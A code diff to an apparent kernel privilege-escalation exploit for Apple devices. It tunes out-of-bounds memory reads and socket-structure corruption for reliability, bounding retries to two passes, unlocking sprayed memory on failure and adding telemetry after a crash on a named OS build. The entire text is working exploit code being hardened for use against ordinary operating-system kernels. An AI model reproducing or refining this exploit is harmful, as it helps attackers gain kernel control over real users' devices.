@@ -93,7 +93,17 @@ kern_return_t cs2_pe_v1(void) {
     uint64_t target_inp_gencnt_list[CS2_MAX_SOCKETS_COUNT] = {0};  // generation count of this instance, every inpcb gets a generation number
     size_t target_inp_gencnt_count = 0;
 
-    while (true) {
+    /* lab law 2026-10-24 (T8150/24A435 fire): upstream retries forever; the
+       17 crashed at pass-2's FIRST oob_read with pass-1 surfaces leaked AND
+       mlocked (munlock never ran on the fail path). Now: 2-pass bound,
+       munlock every pass end, per-pass phys_footprint + oob kr telemetry. */
+    size_t oob_read_fail_count = 0;
+    for (size_t pass = 0; pass < 2; pass++) {
+        {
+            struct task_vm_info tvi; mach_msg_type_number_t tc = TASK_VM_INFO_COUNT;
+            if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&tvi, &tc) == KERN_SUCCESS)
+                LOG("=== outer pass %lu phys_footprint=0x%llx ===", pass, (unsigned long long)tvi.phys_footprint);
+        }
         // again, only for A18
         /*
         if (cs2_ctx.is_a18_devices) {
@@ -181,6 +191,11 @@ kern_return_t cs2_pe_v1(void) {
                 // memory_object -> memory entry at search_mapping_address (VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
                 // oob_size -> 0xf00, oob_offset -> 0x100
                 kr = cs2_oob_read(memory_object, seeking_offset, cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
+                if (kr != KERN_SUCCESS) {
+                    oob_read_fail_count++;
+                    if (oob_read_fail_count <= 4)
+                        LOG("oob_read kr=%#x map=%lu off=%#llx pass=%lu", kr, s, seeking_offset, pass);
+                }
                 if (kr == KERN_SUCCESS) {
                     // LOG_DEBUG("Finding and corrupting socket...");
                     if (cs2_find_and_corrupt(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, &target_inp_gencnt_count, false) == KERN_SUCCESS) {
@@ -213,9 +228,11 @@ kern_return_t cs2_pe_v1(void) {
         // at this point the target sockets are already back to being fd
         cs2_sockets_release();
 
-        // deallocate search mappings
+        // munlock + release surfaces BEFORE deallocating (upstream never
+        // unlocked on the fail path — the pass-2 SIGKILL suspect on 24A435)
         while (search_mappings_count > 0) {
             mach_vm_address_t search_mapping_address = search_mappings[--search_mappings_count];
+            cs2_surface_munlock(search_mapping_address);
             mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
         }
 
@@ -228,6 +245,7 @@ kern_return_t cs2_pe_v1(void) {
         }
     }
 
+    LOG("scan exhausted: 2 full passes, no corruption accepted, oob_read kr-fails=%lu — one tap per fresh boot", oob_read_fail_count);
     free(read_buffer);
     free(write_buffer);
     return KERN_SUCCESS;
